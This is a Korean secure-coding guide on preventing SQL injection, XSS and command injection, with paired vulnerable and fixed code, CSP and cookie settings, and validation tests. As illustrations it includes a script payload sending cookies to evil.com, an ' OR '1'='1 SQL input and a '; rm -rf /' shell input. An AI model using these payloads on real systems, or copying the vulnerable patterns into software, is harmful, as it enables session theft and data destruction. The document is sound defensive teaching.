XSS와 Injection 방어 - 시스템 경계에서 입력을 다루는 법

SELECT * FROM users WHERE id = '1' OR '1'='1'

이 쿼리는 사용자가 입력한 1' OR '1'='1이 SQL 구조 안에 그대로 삽입되면서 만들어진다. WHERE 절이 항상 참이 되어 전체 테이블이 노출된다. XSS도 같은 원리다 — <script> 태그가 HTML에 그대로 들어가면 브라우저가 실행한다.

XSS, SQL Injection, Command Injection은 이름만 다를 뿐 하나의 문제다: 신뢰할 수 없는 입력이 코드로 해석되는 순간.

데이터가 코드로 승격되는 6가지 경로

공격 입력이 해석되는 곳 피해 대상
SQL Injection DB의 SQL 파서 서버 데이터
XSS (Reflected) 브라우저 HTML 파서 사용자 세션
XSS (Stored) 브라우저 HTML 파서 모든 방문자
XSS (DOM-based) 브라우저 JS 엔진 사용자 세션
Command Injection OS 셸 인터프리터 서버 시스템
LDAP Injection 디렉토리 서버 LDAP 파서 인증 시스템

방어 우선순위는 모든 경로에서 동일하다:

  1. 파라미터화 — 구조와 데이터를 분리 (가능하면 반드시 이것)
  2. 출력 인코딩 — 컨텍스트에 맞게 이스케이프
  3. 입력 검증 — 허용 목록 기반 필터링
  4. 심층 방어 — CSP, 쿠키 플래그 등 추가 레이어

SQL Injection: 구조와 데이터를 분리하면 끝난다

Java (JDBC)

// 취약 — 문자열 연결이 구조와 데이터를 섞는다
String query = "SELECT * FROM users WHERE id = '" + userId + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// 안전 — ?가 데이터 자리를 구조적으로 확보한다
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, userId);
ResultSet rs = pstmt.executeQuery();

JPA/Spring Data

// 안전 — 파라미터 바인딩
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// 위험 — 네이티브 쿼리에 문자열 연결
@Query(value = "SELECT * FROM users WHERE name = '" + name + "'", nativeQuery = true)

Python (SQLAlchemy)

# 취약
db.execute(f"SELECT * FROM users WHERE id = '{user_id}'")

# 안전
db.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})

파라미터 바인딩이 불가능한 곳(정렬 컬럼, 테이블명)에서는 허용 목록으로 제한한다:

private static final Set<String> ALLOWED_SORT = Set.of("name", "created", "price");

public List<Product> findAll(String sortBy) {
	if (!ALLOWED_SORT.contains(sortBy)) {
		sortBy = "created";
	}
	return em.createQuery("SELECT p FROM Product p ORDER BY p." + sortBy)
		.getResultList();
}

블랙리스트(금지 목록)는 우회되기 쉽다. 허용 목록만이 안전하다.

XSS: 같은 입력, 다른 컨텍스트, 다른 인코딩

<p>검색어: <script>document.location='https://evil.com/?c='+document.cookie</script></p>

서버가 사용자 입력을 그대로 HTML에 넣으면 브라우저가 실행한다. 쿠키, 세션, 개인정보가 공격자 서버로 전송된다.

XSS 유형 트리거 위험도
Reflected 피해자가 조작된 링크 클릭 (search?q=<script>...) 표적 공격
Stored 누구든 해당 페이지 방문 (게시판 댓글 등) 대량 피해
DOM-based JS가 URL fragment를 DOM에 삽입 (innerHTML = location.hash) 서버 무관

출력 컨텍스트마다 인코딩이 다르다

컨텍스트 인코딩 예시
HTML body HTML entity < → &lt;
HTML attribute attribute 인코딩 " → &quot;
JS 문자열 JS 이스케이프 ' → \'
URL 파라미터 percent 인코딩 < → %3C

프레임워크의 안전한 기본값 vs 위험한 탈출구

Thymeleaf

<!-- 안전 — 자동 이스케이프 -->
<p th:text="${userInput}">기본값</p>

<!-- 위험 — 이스케이프 없음. 사용자 입력에 절대 쓰지 않는다 -->
<p th:utext="${userInput}">기본값</p>

React / Vue

// React — 안전
return <p>{userInput}</p>;

// React — 위험. 이름부터 경고하고 있다
return <p dangerouslySetInnerHTML={{__html: userInput}} />;

<!-- Vue — 안전 -->
<p>{{ userInput }}</p>

<!-- Vue — 위험 -->
<p v-html="userInput"></p>

모든 프레임워크가 같은 패턴을 따른다:

프레임워크 안전한 기본값 위험한 탈출구
Thymeleaf th:text th:utext
React JSX {} dangerouslySetInnerHTML
Vue {{ }} v-html
Angular {{ }} bypassSecurityTrust*

탈출구를 쓸 때는 반드시 이유를 코멘트로 남긴다.

XSS가 뚫렸을 때의 2차 방어선

CSP (Content Security Policy)

인코딩을 한 곳이라도 빠뜨리면 XSS가 성공한다. CSP는 그때도 스크립트 실행을 차단한다:

Content-Security-Policy: 
	default-src 'self';
	script-src 'self' 'nonce-{random}';
	style-src 'self' 'unsafe-inline';
	img-src 'self' data: https:;
	object-src 'none';
	base-uri 'self';

Spring Security 설정:

@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
	http.headers(headers -> headers
		.contentSecurityPolicy(csp -> csp
			.policyDirectives("default-src 'self'; script-src 'self'")
		)
	);
	return http.build();
}

쿠키 보호

XSS가 성공해도 쿠키 탈취를 막는다:

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
플래그 효과
HttpOnly JS에서 document.cookie 접근 차단
Secure HTTPS에서만 전송
SameSite=Strict 크로스사이트 요청 시 쿠키 미전송

Command Injection: 셸도 같은 원리다

# 취약 — 셸이 ;를 명령 구분자로 해석
os.system(f"ping -c 1 {host}")
# 입력: 127.0.0.1; rm -rf /

# 안전 — 배열 형태로 전달하면 셸 해석 없음
subprocess.run(["ping", "-c", "1", host], capture_output=True)

// 취약
Runtime.getRuntime().exec("ping -c 1 " + host);

// 안전
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
Process p = pb.start();

SQL이든 HTML이든 셸이든, 원칙은 하나다: 명령 구조와 데이터를 분리.

입력 검증은 왜 단독으로 부족한가

같은 username 값이 SQL 쿼리에도, HTML 페이지에도, URL에도 들어간다. 입력 시점에는 어떤 컨텍스트에서 사용될지 모른다. 그래서 입력 검증은 형식 제한(1차 필터)이고, 출력 인코딩이 최종 방어선이다.

둘 다 해야 한다:

// 입력 검증 — 시스템 경계에서 형식 제한
public record CreateUserRequest(
	@NotBlank
	@Size(min = 3, max = 20)
	@Pattern(regexp = "^[a-zA-Z0-9_]+$", message = "영문, 숫자, 밑줄만 허용")
	String username,

	@NotBlank @Email
	String email
) {}

@PostMapping("/users")
public ResponseEntity<?> createUser(@Valid @RequestBody CreateUserRequest req) {
	return ResponseEntity.ok(userService.create(req));
}

// 출력 인코딩 — 사용 시점에 컨텍스트에 맞게
// HTML: th:text (자동), SQL: PreparedStatement, URL: URLEncoder.encode()

테스트에서도 검증한다:

@Test
void sqlInjectionInUsername_shouldBeRejected() {
	var req = new CreateUserRequest("admin' OR '1'='1", "test@test.com");
	var violations = validator.validate(req);
	assertFalse(violations.isEmpty());
}

@Test
void xssInComment_shouldBeEscaped() {
	String input = "<script>alert('xss')</script>";
	String output = HtmlUtils.htmlEscape(input);
	assertFalse(output.contains("<script>"));
	assertTrue(output.contains("&lt;script&gt;"));
}

Spring Boot 보안 체크리스트

[ ] SQL: 모든 쿼리에 파라미터 바인딩, 문자열 연결 없음
[ ] XSS: th:text 사용, th:utext는 sanitize 후에만
[ ] CSP: Content-Security-Policy 헤더 설정
[ ] Cookie: HttpOnly, Secure, SameSite=Strict
[ ] 입력검증: @Valid + Bean Validation
[ ] 의존성: OWASP Dependency-Check로 취약 라이브러리 탐지
테이크어웨이

Injection 방어는 "입력을 잘 걸러내는 것"이 아니라 "데이터가 코드로 해석될 수 없는 구조를 만드는 것"이다. Prepared Statement, th:text, subprocess.run([...]) — 전부 같은 원칙의 다른 표현이다.
